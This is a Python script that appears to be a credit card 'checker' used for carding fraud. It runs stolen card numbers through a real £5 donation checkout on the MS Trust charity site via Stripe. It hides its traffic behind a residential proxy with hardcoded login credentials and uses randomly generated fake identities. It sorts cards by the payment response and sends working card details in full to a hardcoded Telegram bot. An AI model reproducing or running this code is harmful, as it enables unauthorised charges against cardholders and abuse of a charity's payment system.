#=========================library==================================#
import requests , re , random , string , uuid , user_agent , base64 , time
from requests_toolbelt.multipart.encoder import MultipartEncoder
from colorama import Fore, Back, Style, init
from bs4 import BeautifulSoup
from nextcaptcha import NextCaptchaAPI 
import logging
from urllib.parse import unquote
import json
#=========================library==================================#


#=============================toools===============================#

#============================checker===============================#
def Tele(ccx):
    ccx = ccx.strip().split('\n')[0]
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]

    if "20" in yy:
        yy = yy.split("20")[1]
    username = "pcZ9DikmY6-res-any"
    password = "PC_7q0GZZMMdvBLD388B"
    proxy = "proxy.rapidseedbox.com:5959"
    proxies = {
        "http": f"http://{username}:{password}@{proxy}",
        "https": f"http://{username}:{password}@{proxy}"
    }
    r = requests.Session()
    r.proxies.update(proxies)
    user = user_agent.generate_user_agent()
    def	 name():
        name = ''.join(random.choices(string.ascii_lowercase, k=6))	
        return f"{name}"	
    first = (name())
    last = (name())
    con = (name())
    def acc():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@gmail.com"
    acc = (acc())
    GUID = uuid.uuid4()
    MUID = uuid.uuid4()
    SID = uuid.uuid4()
    init(autoreset=True)
    time.sleep(10)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'If-Modified-Since': 'Tue, 18 Feb 2025 14:46:27 GMT',
        'If-None-Match': '"57c9e7e01f78c0112658b131a5f871b0"',
        'Referer': 'https://shop.mstrust.org.uk/donations/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user,
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = r.get('https://shop.mstrust.org.uk/donations/donate-5/', headers=headers)
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://shop.mstrust.org.uk',
        'Referer': 'https://shop.mstrust.org.uk/donations/donate-5/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': user,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'wc-ajax': 'xoo_wsc_add_to_cart',
    }

    data = {
        'quantity': '1',
        'gtm4wp_product_data': '{"internal_id":245,"item_id":"GG05","item_name":"Donate \\u00a35","sku":"GG05","price":5,"stocklevel":null,"stockstatus":"instock","google_business_vertical":"retail","item_category":"Donations","id":"GG05"}',
        'add-to-cart': '245',
        'action': 'xoo_wsc_add_to_cart',
    }

    response = r.post('https://shop.mstrust.org.uk/', params=params, headers=headers, data=data)




    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Referer': 'https://shop.mstrust.org.uk/donations/donate-5/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user,
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = r.get('https://shop.mstrust.org.uk/checkout/', headers=headers)
    sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
    giftaid_order_security = re.search(r'name="giftaid_order_security" value="(.*?)"', response.text).group(1)
    check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://shop.mstrust.org.uk',
        'Referer': 'https://shop.mstrust.org.uk/checkout/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': user,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'wc-ajax': 'update_order_review',
    }

    data = f'security={sec}&payment_method=stripe&country=PR&state=&postcode=00601-0017&city=Adjuntas&address=37+Calle+Munoz+Rivera+Unit+1040&address_2=&s_country=PR&s_state=&s_postcode=00601-0017&s_city=Adjuntas&s_address=37+Calle+Munoz+Rivera+Unit+1040&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fshop.mstrust.org.uk%252Fdonations%252Fdonate-5%252F%26wc_order_attribution_session_start_time%3D2025-02-18%252014%253A44%253A30%26wc_order_attribution_session_pages%3D7%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F133.0.0.0%2520Safari%252F537.36%26billing_first_name%3D{first}%26billing_last_name%3D{last}%26billing_company%3D%26billing_country%3DPR%26billing_address_1%3D37%2520Calle%2520Munoz%2520Rivera%2520Unit%25201040%26billing_address_2%3D%26billing_city%3DAdjuntas%26billing_state%3D%26billing_postcode%3D00601-0017%26billing_phone%3D9195157621%26billing_email%3D{acc}%26account_password%3D%26health_care_professional%3D%26giftaid_order_security%3D8fa177359c%26_wp_http_referer%3D%252Fcheckout%252F%26order_comments%3D%26ign-donation%3D0%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F'

    response = r.post('https://shop.mstrust.org.uk/', params=params, headers=headers, data=data)
    headers = {
        'accept': 'application/json',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }

    data = f'billing_details[name]={first}+{last}&billing_details[email]={acc}&billing_details[phone]=9195157621&billing_details[address][city]=Adjuntas&billing_details[address][country]=PR&billing_details[address][line1]=37+Calle+Munoz+Rivera+Unit+1040&billing_details[address][line2]=&billing_details[address][postal_code]=00601-0017&billing_details[address][state]=&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fd72854d2f1%3B+stripe-js-v3%2Fd72854d2f1%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.mstrust.org.uk&time_on_page=17979&client_attribution_metadata[client_session_id]=7db8446e-8d96-41d8-a4a2-c33eba9f556f&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid={GUID}&muid={MUID}&sid={SID}&key=pk_live_51OHqUeFpDeX1uGTmiU389WkEYsTwDJRPRNCvVDdsnEmQiQhYi2ZspwHXbbNJ7LE0PyQ28YqRxF54mQyRi1coTip9007xOT91Z4&_stripe_version=2024-06-20'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id = response.json()['id']
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://shop.mstrust.org.uk',
        'Referer': 'https://shop.mstrust.org.uk/checkout/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': user,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'wc-ajax': 'checkout',
    }

    data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fshop.mstrust.org.uk%2Fdonations%2Fdonate-5%2F&wc_order_attribution_session_start_time=2025-02-18+14%3A44%3A30&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.0.0+Safari%2F537.36&billing_first_name={first}&billing_last_name={last}&billing_company=&billing_country=PR&billing_address_1=37+Calle+Munoz+Rivera+Unit+1040&billing_address_2=&billing_city=Adjuntas&billing_state=&billing_postcode=00601-0017&billing_phone=9195157621&billing_email={acc}&account_password=&health_care_professional=&giftaid_order_security={giftaid_order_security}&_wp_http_referer=%2Fcheckout%2F&marketing_preferences_post=yes&marketing_preferences_email=yes&are_you_over_18=I+am+16+or+older&order_comments=&ign-donation=0&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method={id}'

    response = r.post('https://shop.mstrust.org.uk/', params=params, headers=headers, data=data)



    result2 = response.text

    if "success" in result2 or "succeeded" in result2:
        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                    Charge ✅
                    
                    [↯] 𝗖𝗖 ⇾ {ccx} 
                """)
        return 'success'

    elif 'requires_action' in result2:
        return 'requires_action'

    elif 'The provided PaymentMethod has failed authentication. You can provide payment_method_data or a new PaymentMethod to attempt to fulfill this PaymentIntent again' in result2:
        return 'requires_action'

    elif 'not support this type of purchase' in result2 or 'do_not_honor' in result2:
        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                    Your Card dose Not Support ✅
                    
                    [↯] 𝗖𝗖 ⇾ {ccx} 
                """)
        return 'not support this type of purchase'

    elif 'insufficient funds' in result2:
        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                    FUNDS ✅
                    
                    [↯] 𝗖𝗖 ⇾ {ccx} 
                """)
        return 'insufficient funds'

    elif 'security code is incorrect' in result2:
        requests.post(f"""https://api.telegram.org/bot7137717547:AAFRxhQNER3dMfOeCrob5IqsCaDBbWCcfFQ/sendMessage?chat_id=1314540100&text=
                    CCN ✅
                    
                    [↯] 𝗖𝗖 ⇾ {ccx} 
                """)
        return 'security code is incorrect'

    else:
        parsed_data = json.loads(response.text)
        messages = parsed_data.get("messages", "")
        match = re.search(r"There was an error processing the payment:\s*(.+?)\s*</li>", messages).group(1).strip()
        return match
